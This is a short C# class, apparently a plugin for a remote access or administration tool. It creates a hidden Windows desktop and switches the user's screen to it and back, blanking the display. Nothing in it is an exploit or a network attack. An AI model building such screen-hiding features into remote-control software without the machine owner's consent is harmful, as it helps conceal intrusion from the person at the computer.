﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;


namespace Plugin.Handler
{
    public class HandleBlankScreen
    {
        enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE = 0,
            DESKTOP_READOBJECTS = 0x0001,
            DESKTOP_CREATEWINDOW = 0x0002,
            DESKTOP_CREATEMENU = 0x0004,
            DESKTOP_HOOKCONTROL = 0x0008,
            DESKTOP_JOURNALRECORD = 0x0010,
            DESKTOP_JOURNALPLAYBACK = 0x0020,
            DESKTOP_ENUMERATE = 0x0040,
            DESKTOP_WRITEOBJECTS = 0x0080,
            DESKTOP_SWITCHDESKTOP = 0x0100,

            GENERIC_ALL = (DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                            DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                            DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
        }

        // old desktop's handle, obtained by getting the current desktop assigned for this thread
        public readonly IntPtr hOldDesktop = Native.GetThreadDesktop(Native.GetCurrentThreadId());

        // new desktop's handle, assigned automatically by CreateDesktop
        public IntPtr hNewDesktop = Native.CreateDesktop("RandomDesktopName", IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);

        public void Run()
        {
            try
            {
                Native.SwitchDesktop(hNewDesktop);
            }
            catch { }
        }

        public void Stop()
        {
            try
            {
                Native.SwitchDesktop(hOldDesktop);
            }
            catch { }
        }
    }
}